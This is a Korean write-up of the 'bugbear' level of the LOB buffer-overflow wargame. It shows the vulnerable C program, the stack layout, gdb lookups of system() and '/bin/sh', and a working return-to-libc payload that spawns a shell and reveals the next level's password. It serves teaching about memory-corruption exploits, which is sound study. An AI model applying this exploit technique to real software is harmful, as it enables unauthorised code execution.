============================================================================================================
[redhat-lob] (13) bugbear
============================================================================================================

.. graphviz::

    digraph foo {
        a -> b -> c -> d -> e;

        a [shape=box, label="dummy*44 + &system() + dummy*4 + &(/bin/sh)"];
        b [shape=box, color=lightblue, label="strcpy"];
        c [shape=box, label="Buffer Overflow"];
        e [shape=box, label="libc"];
    }

|

source code
============================================================================================================

.. code-block:: c

    #include <stdio.h>
    #include <stdlib.h>

    main(int argc, char *argv[])
    {
        char buffer[40];
        int i;

        if(argc < 2){
            printf("argv error\n");
            exit(0);
        }

        if(argv[1][47] == '\xbf')
        {
            printf("stack betrayed you!!\n");
            exit(0);
        }

        strcpy(buffer, argv[1]);
        printf("%s\n", buffer);
    }



Vulnerabliity Vector
============================================================================================================

main 함수의 ret를 덮어씌워 오버플로우를 발생시킨다.

.. code-block:: console

    ==============================
    LOW     
    ------------------------------
    local variables of main
    saved registers of main
    return address of main <<- overflow
    argc
    argv
    envp
    stack from startup code
    argc
    argv pointers
    NULL that ends argv[]
    environment pointers
    NULL that ends envp[]
    ELF Auxiliary Table
    argv strings
    environment strings
    program name
    NULL
    ------------------------------
    HIGH (0xC0000000)    
    ==============================

|

Segmentation fault
============================================================================================================

Overflow condition 

- argv[1]의 47번째 문자열이 "\\xbf"이어야 함

.. code-block:: console

    ※ 시작시 bash2 명령을 입력하고 bash2 쉘 상태에서 진행
    $ bash2
    $ ./bugbear `python -c 'print "a"*40'`
    aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa

    $ ./bugbear `python -c 'print "a"*44'`
    aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa
    Segmentation fault



exploit
============================================================================================================

gdb를 통해 system()함수 주소를 확인하고, "/bin/sh" 문자열 위치 주소를 확인한다.

.. code-block:: console

    (gdb) p system
    $1 = {<text variable, no debug info>} 0x40058ae0 <__libc_system>


.. code-block:: c

    #include <stdio.h>
    main(){
        long shell=0x40058ae0;
        while(memcmp((void*)shell, "/bin/sh", 8))
        shell++;
        printf("%x\n",shell);
    }
 
.. code-block:: console

    $ ./findsh
    400fbff9


|

libc를 이용한 쉘코드 실행
------------------------------------------------------------------------------------------------------------

.. code-block:: console

    libc ->> shellcode
    ==============================
    LOW     
    ------------------------------
    local variables of problem_child
    saved registers of problem_child
    return address of problem_child <<- overflow
    argc
    argv
    envp
    stack from startup code
    argc
    argv pointers ->> shellcode
    NULL that ends argv[]
    environment pointers
    NULL that ends envp[]
    ELF Auxiliary Table
    argv strings
    environment strings
    program name
    NULL
    ------------------------------
    HIGH (0xC0000000)
    ==============================

|



.. code-block:: console

    $ ./bugbear `python -c 'print "A"*44+"\xe0\x8a\x05\x40"+"AAAA"+"\xf9\xbf\x0f\x40"'`


    bash$ whoami
    bugbear
    bash$ my-pass
    euid = 513
    new divide



